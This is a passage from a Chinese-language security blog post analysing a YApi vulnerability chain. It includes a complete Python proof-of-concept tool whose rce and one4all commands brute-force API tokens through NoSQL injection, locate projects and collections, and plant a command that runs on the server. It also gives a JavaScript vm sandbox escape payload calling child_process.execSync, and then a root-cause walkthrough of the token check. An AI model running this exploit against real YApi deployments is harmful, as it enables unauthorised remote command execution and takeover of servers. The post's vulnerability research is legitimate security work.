token)</span><br><span class="line">    e = aes_encode(<span class="string">f&#x27;<span class="subst">&#123;aid&#125;</span>|<span class="subst">&#123;token&#125;</span>&#x27;</span>)</span><br><span class="line">    click.echo(<span class="string">f&#x27;your owner id is: <span class="subst">&#123;aid&#125;</span>, encrypted token is <span class="subst">&#123;e&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@cli.command(<span class="params"><span class="string">&#x27;project&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;--url&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, required=<span class="literal">True</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;-o&#x27;</span>, <span class="string">&#x27;--owner-id&#x27;</span>, <span class="string">&#x27;owner&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, required=<span class="literal">True</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;--token&#x27;</span>, <span class="string">&#x27;token&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;Token that get from first step&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd_project</span>(<span class="params">url, owner, token</span>):</span><br><span class="line">    token = aes_encode(<span class="string">f&#x27;<span class="subst">&#123;owner&#125;</span>|<span class="subst">&#123;token&#125;</span>&#x27;</span>)</span><br><span class="line">    project = find_project(url, token)</span><br><span class="line">    <span class="keyword">if</span> project:</span><br><span class="line">        logger.info(<span class="string">&#x27;[+] project by this token: %r&#x27;</span>, project)</span><br><span class="line">        click.echo(<span class="string">f&#x27;your project id is: <span class="subst">&#123;project[<span class="string">&quot;_id&quot;</span>]&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@cli.command(<span class="params"><span class="string">&#x27;col&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;--url&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, required=<span class="literal">True</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;-o&#x27;</span>, <span class="string">&#x27;--owner-id&#x27;</span>, <span class="string">&#x27;owner&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, required=<span class="literal">True</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;--token&#x27;</span>, <span class="string">&#x27;token&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;Token that get from first step&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;--from&#x27;</span>, <span class="string">&#x27;brute_from&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, required=<span class="literal">False</span>, default=<span class="number">1</span>, <span class="built_in">help</span>=<span class="string">&#x27;Brute Col id from this number&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;--to&#x27;</span>, <span class="string">&#x27;brute_to&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, required=<span class="literal">False</span>, default=<span class="number">200</span>, <span class="built_in">help</span>=<span class="string">&#x27;Brute Col id to this number&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd_col</span>(<span class="params">url, owner, token, brute_from, brute_to</span>):</span><br><span class="line">    token = aes_encode(<span class="string">f&#x27;<span class="subst">&#123;owner&#125;</span>|<span class="subst">&#123;token&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> find_col(url, token, brute_from, brute_to):</span><br><span class="line">        click.echo(<span class="string">f&#x27;found a valid col id: <span class="subst">&#123;i&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@cli.command(<span class="params"><span class="string">&#x27;rce&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;--url&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, required=<span class="literal">True</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;-o&#x27;</span>, <span class="string">&#x27;--owner-id&#x27;</span>, <span class="string">&#x27;owner&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, required=<span class="literal">True</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;--token&#x27;</span>, <span class="string">&#x27;token&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;Token that get from first step&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;--pid&#x27;</span>, <span class="string">&#x27;project_id&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, required=<span class="literal">True</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;--cid&#x27;</span>, <span class="string">&#x27;col_id&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, required=<span class="literal">True</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;--command&#x27;</span>, <span class="string">&#x27;command&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;Command that you want to execute&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd_rce</span>(<span class="params">url, owner, token, project_id, col_id, command</span>):</span><br><span class="line">    token = aes_encode(<span class="string">f&#x27;<span class="subst">&#123;owner&#125;</span>|<span class="subst">&#123;token&#125;</span>&#x27;</span>)</span><br><span class="line">    project = find_project(url, token, project_id)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> project:</span><br><span class="line">        click.echo(<span class="string">&#x27;[-] failed to get project&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    old_after_script = project.get(<span class="string">&#x27;after_script&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> update_project(url, token, project_id, command):</span><br><span class="line">        click.echo(<span class="string">&#x27;[-] failed to update project&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    output = run_auto_test(url, token, col_id)</span><br><span class="line">    <span class="keyword">if</span> output:</span><br><span class="line">        click.echo(output)</span><br><span class="line">        clear_project(url, token, project_id, old_after_script)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    clear_project(url, token, project_id, old_after_script)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@cli.command(<span class="params"><span class="string">&#x27;one4all&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;--url&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, required=<span class="literal">True</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;--count&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">5</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;--command&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="string">&#x27;id&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd_one4all</span>(<span class="params">url, count, command</span>):</span><br><span class="line">    already = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(count):</span><br><span class="line">        token = brute_token(url, already)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">            logger.info(<span class="string">&#x27;[-] no new token found, exit...&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        already.append(token)</span><br><span class="line">        logger.info(<span class="string">&#x27;[+] find a new token: %s&#x27;</span>, token)</span><br><span class="line">        owner_id = find_owner_uid(url, token)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> owner_id:</span><br><span class="line">            logger.info(<span class="string">&#x27;[-] failed to find the owner id using token %s&#x27;</span>, token)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        etoken = aes_encode(<span class="string">f&#x27;<span class="subst">&#123;owner_id&#125;</span>|<span class="subst">&#123;token&#125;</span>&#x27;</span>)</span><br><span class="line">        logger.info(<span class="string">&#x27;[+] find a new owner id: %r, encrypted token: %s&#x27;</span>, owner_id, etoken)</span><br><span class="line">        project = find_project(url, etoken)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> project:</span><br><span class="line">            logger.info(<span class="string">&#x27;[-] failed to find project using token %s&#x27;</span>, token)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        project_id = project[<span class="string">&#x27;_id&#x27;</span>]</span><br><span class="line">        logger.info(<span class="string">&#x27;[+] project_id = %s, project = %r&#x27;</span>, project_id, project)</span><br><span class="line">        col_ids = find_col(url, etoken, <span class="number">1</span>, <span class="number">200</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> col_ids:</span><br><span class="line">            logger.info(<span class="string">&#x27;[+] failed to find cols in project %s, try next project...&#x27;</span>, project_id)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> col_id <span class="keyword">in</span> col_ids:</span><br><span class="line">            logger.info(<span class="string">&#x27;[+] col_id = %s&#x27;</span>, col_id)</span><br><span class="line">            click.echo(<span class="string">f&#x27;hit: project_id: <span class="subst">&#123;project_id&#125;</span> | owner_id: <span class="subst">&#123;owner_id&#125;</span> | col_id: <span class="subst">&#123;col_id&#125;</span> | token: <span class="subst">&#123;token&#125;</span>&#x27;</span>)</span><br><span class="line">            click.echo(<span class="string">f&#x27;suggestion: python <span class="subst">&#123;sys.argv[<span class="number">0</span>]&#125;</span> rce -u <span class="subst">&#123;url&#125;</span> -t <span class="subst">&#123;token&#125;</span> -o <span class="subst">&#123;owner_id&#125;</span> --pid <span class="subst">&#123;project_id&#125;</span> --cid <span class="subst">&#123;col_id&#125;</span> --command=&quot;<span class="subst">&#123;command&#125;</span>&quot;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> cmd_rce.callback(url, owner_id, token, project_id, col_id, command):</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    cli()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这个脚本写的比较详细和实用。内置几个板块<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1709179496936-fe511f81-0e22-449d-b2af-529db95e3978.png#averageHue=%232a2b35&clientId=uf4209ee2-acab-4&from=paste&height=180&id=u4a26ef10&originHeight=225&originWidth=814&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=100595&status=done&style=none&taskId=u8fd80baf-7beb-4dbb-9477-12205f3fde6&title=&width=651.2" alt="image.png"><br>dec和enc是用来加解密token的，我们先利用nosql注入可以注出token<br><code> python poc.py --debug one4all -u [http://127.0.0.1:3000/](http://127.0.0.1:3000/)</code><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1709179557478-c544091f-ae2f-43d0-8d76-c34e1554c620.png#averageHue=%232b2d36&clientId=uf4209ee2-acab-4&from=paste&height=574&id=uf538253c&originHeight=717&originWidth=1487&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=757817&status=done&style=none&taskId=u997a7974-a08b-4d4f-9cad-a86c455324f&title=&width=1189.6" alt="image.png"><br>获取到token后利用vm沙盒逃逸去rce。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> sandbox = <span class="variable language_">this</span></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">ObjectConstructor</span> = <span class="variable language_">this</span>.<span class="property">constructor</span></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">FunctionConstructor</span> = <span class="title class_">ObjectConstructor</span>.<span class="property">constructor</span></span><br><span class="line"><span class="keyword">const</span> myfun = <span class="title class_">FunctionConstructor</span>(<span class="string">&#x27;return process&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> process = <span class="title function_">myfun</span>()</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Buffer</span> = <span class="title class_">FunctionConstructor</span>(<span class="string">&#x27;return Buffer&#x27;</span>)()</span><br><span class="line"><span class="keyword">const</span> output = process.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">execSync</span>(<span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="string">&#x27;%s&#x27;</span>, <span class="string">&#x27;hex&#x27;</span>).<span class="title function_">toString</span>()).<span class="title function_">toString</span>()</span><br><span class="line">context.<span class="property">responseData</span> = <span class="string">&#x27;testtest&#x27;</span> + output + <span class="string">&#x27;testtest&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1709179781278-e69a30dd-fff1-43b4-b210-8188616714c8.png#averageHue=%232a2c36&clientId=uf4209ee2-acab-4&from=paste&height=429&id=ud7b1ca35&originHeight=536&originWidth=1460&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=446314&status=done&style=none&taskId=u0ab4a60c-850d-4e14-aeac-1a9b763af5f&title=&width=1168" alt="image.png"><br>复现起来比较简单，分析一下原因。</p>
<h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>在代码的base.js有一段逻辑</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (token &amp;&amp; (openApiRouter.<span class="title function_">indexOf</span>(ctx.<span class="property">path</span>) &gt; -<span class="number">1</span> || ctx.<span class="property">path</span>.<span class="title function_">indexOf</span>(<span class="string">&#x27;/api/open/&#x27;</span>) === <span class="number">0</span> )) &#123;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">let</span> tokens = <span class="title function_">parseToken</span>(token)</span><br><span class="line"></span><br><span class="line">      <span class="keyword">const</span> oldTokenUid = <span class="string">&#x27;999999&#x27;</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">let</span> tokenUid = oldTokenUid;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(!tokens)&#123;</span><br><span class="line">        <span class="keyword">let</span> checkId = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">getProjectIdByToken</span>(token);</span><br><span class="line">        <span class="keyword">if</span>(!checkId)<span class="keyword">return</span>;</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        token = tokens.<span class="property">projectToken</span>;</span><br><span class="line">        tokenUid = tokens.<span class="property">uid</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// if (this.$auth) &#123;</span></span><br><span class="line">      <span class="comment">//   ctx.params.project_id = await this.getProjectIdByToken(token);</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">//   if (!ctx.params.project_id) &#123;</span></span><br><span class="line">      <span class="comment">//     return (this.$tokenAuth = false);</span></span><br><span class="line">      <span class="comment">//   &#125;</span></span><br><span class="line">      <span class="comment">//   return (this.$tokenAuth = true);</span></span><br><span class="line">      <span class="comment">// &#125;</span></span><br><span class="line">      </span><br><span class="line">      <span class="keyword">let</span> checkId = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">getProjectIdByToken</span>(token);</span><br><span class="line">      <span class="keyword">if</span>(!checkId)&#123;</span><br><span class="line">        ctx.<span class="property">body</span> = yapi.<span class="property">commons</span>.<span class="title function_">resReturn</span>(<span class="literal">null</span>, <span class="number">42014</span>, <span class="string">&#x27;token 无效&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">let</span> projectData = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">projectModel</span>.<span class="title function_">get</span>(checkId);</span><br><span class="line">      <span class="keyword">if</span> (projectData) &#123;</span><br><span class="line">        ctx.<span class="property">query</span>.<span class="property">pid</span> = checkId; <span class="comment">// 兼容：/api/plugin/export</span></span><br><span class="line">        ctx.<span class="property">params</span>.<span class="property">project_id</span> = checkId;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">$tokenAuth</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">$uid</span> = tokenUid;</span><br><span class="line">        <span class="keyword">let</span> result;</span><br><span class="line">        <span class="keyword">if</span>(tokenUid === oldTokenUid)&#123;</span><br><span class="line">          result = &#123;</span><br><span class="line">            <span class="attr">_id</span>: tokenUid,</span><br><span class="line">            <span class="attr">role</span>: <span class="string">&#x27;member&#x27;</span>,</span><br><span class="line">            <span class="attr">username</span>: <span class="string">&#x27;system&#x27;</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">          <span class="keyword">let</span> userInst = yapi.<span class="title function_">getInst</span>(userModel); <span class="comment">//创建user实体</span></span><br><span class="line">          result = <span class="keyword">await</span> userInst.<span class="title function_">findById</span>(tokenUid);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">$user</span> = result;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">$auth</span> = <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>可以看到假如不为open接口，那就需要通过token的鉴权<code>getProjectIdByToken</code></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="title function_">getProjectIdByToken</span>(<span class="params">token</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> projectId = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">tokenModel</span>.<span class="title function_">findId</span>(token);</span><br><span class="line">    <span class="keyword">if</span> (projectId) &#123;</span><br><span class="line">      <span class="keyword">return</span> projectId.<span class="title function_">toObject</span>().<span class="property">project_id</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>调用了findId去查找project，问题也就出在这里了。token的类型没有做限制</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">findId</span>(<span class="params">token</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">model</span></span><br><span class="line">    .<span class="title function_">findOne</span>(&#123;</span><br><span class="line">      <span class="attr">token</span>: token</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">select</span>(<span class="string">&#x27;project_id&#x27;</span>)</span><br><span class="line">    .<span class="title function_">exec</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>假如token为<code>&#123;&quot;$ne&quot;:&quot;xxx&quot;&#125;</code>那么就可以进行nosql注入了。我们获取了token后就可以访问一些授权接口了。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1709193102169-68bcd178-c53e-4002-8a87-549f515b88a9.png#averageHue=%23292e36&clientId=ue0e1a4bb-8bd9-4&from=paste&height=431&id=ue775789e&originHeight=539&originWidth=1719&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=136552&status=done&style=none&taskId=u99c60680-3793-4222-b1d0-1cae03b803b&title=&width=1375.2" alt="image.png"><br>runautotest是一个需要授权的接口</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">$tokenAuth</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> (ctx.<span class="property">body</span> = yapi.<span class="property">commons</span>.<span class="title function_">resReturn</span>(<span class="literal">null</span>, <span class="number">40022</span>, <span class="string">&#x27;token 验证失败&#x27;</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>首先鉴定token是否正确。上一步我们是可以伪造token的，因此可以访问该接口<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1709193205624-94782213-d089-404d-9dd8-506f2a718199.png#averageHue=%23292d36&clientId=ue0e1a4bb-8bd9-4&from=paste&height=455&id=u90e83081&originHeight=569&originWidth=1264&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=69260&status=done&style=none&taskId=uf11bc78f-6a73-4aed-b293-bf8ed789f27&title=&width=1011.2" alt="image.png"><br>在这段代码中我们可以传入pre_script去handleTest方法内。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1709193527741-7432fd68-3444-4a0c-9d9d-251536090c26.png#averageHue=%23282d35&clientId=ue0e1a4bb-8bd9-4&from=paste&height=419&id=ubc2ccd5e&originHeight=524&originWidth=1306&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=75466&status=done&style=none&taskId=u8178eaaf-ff55-4bb9-bc4c-71dca91e7b4&title=&width=1044.8" alt="image.png"><br>会进入crossRequest内。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1709193543100-5ed5e235-7306-4ce6-a302-2d5621ba7cc1.png#averageHue=%23282d35&clientId=ue0e1a4bb-8bd9-4&from=paste&height=286&id=u95a8c990&originHeight=357&originWidth=910&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=44325&status=done&style=none&taskId=u421768ae-4eee-432a-9bdb-36483e28365&title=&width=728" alt="image.png"><br>进入sandbox函数进行沙盒执行<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1709193566643-75bbd580-553d-481c-952c-b8e330940a3d.png#averageHue=%23292d36&clientId=ue0e1a4bb-8bd9-4&from=paste&height=228&id=u8fe4b953&originHeight=285&originWidth=873&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=40786&status=done&style=none&taskId=ud5d244b3-e7dd-4608-b272-d97ca7d7237&title=&width=698.4" alt="image.png"><br>用的是vm模块，因此存在逃逸命令执行。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1709193779386-568c1798-7398-40cf-9935-0b28f2c87d13.png#averageHue=%23f4f4f4&clientId=ue0e1a4bb-8bd9-4&from=paste&height=804&id=u939d2c68&originHeight=1005&originWidth=1892&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=53070&status=done&style=none&taskId=ufa11a244-bf06-4f79-9f1a-ba6661fb216&title=&width=1513.6" alt="image.png"><br>对应project的settings板块，可以看到有pre和after 2个script。</p>

    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/CVE/" class="tag">#CVE</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2024/03/19/%E6%98%A5%E7%A7%8B%E8%BF%90%E9%95%9C%20Hospital%20Writeup/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">春秋云镜 Hospital Writeup</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/2024/03/10/CVE-2023-49070_CVE-2023-51467%20Apache%20OfBiz%20%E9%89%B4%E6%9D%83%E7%BB%95%E8%BF%87RCE/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">CVE-2023-49070/CVE-2023-51467 Apache OfBiz 鉴权绕过RCE</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
                
                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
                
                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
                
                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2025 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
		
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>